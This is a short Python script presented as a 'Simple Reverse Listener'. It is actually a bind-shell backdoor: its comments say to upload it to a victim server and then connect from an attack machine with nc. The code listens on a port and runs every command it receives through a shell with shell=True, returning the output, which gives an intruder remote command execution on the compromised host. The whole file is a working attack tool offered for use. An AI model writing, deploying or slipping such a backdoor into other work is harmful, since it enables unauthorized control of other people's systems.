#!/usr/bin/env python
__author__ = "Munir Njiru"
__email__ = "munir@alien-within.com"
__status__ = "Production"

#To connect to it upload the script on the victim server 
#On your attack machine run the command below:

#nc target-ip target-port

##########################################
#       Simple Reverse Listener
#         by Alienwithin
###########################################
import socket
import subprocess
import sys

ip = "victim-ip"
port = 4445

server =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((ip, port))
server.listen(10)

print ("Listener ready on %s:%d" % (ip,port))

client, addr = server.accept()

print ("Connected to %s on port %d" % (ip,port))	
while True:
	data = str(client.recv(1024))
	data = data.strip()
	if not data:
		print "command cannot be blank my friend"
	elif data.strip() == "terminate":
		client.sendall("bye buddy")
		client.close()
		sys.exit(0)
	else:
		output = subprocess.check_output(data, shell=True)
		client.sendall(output)
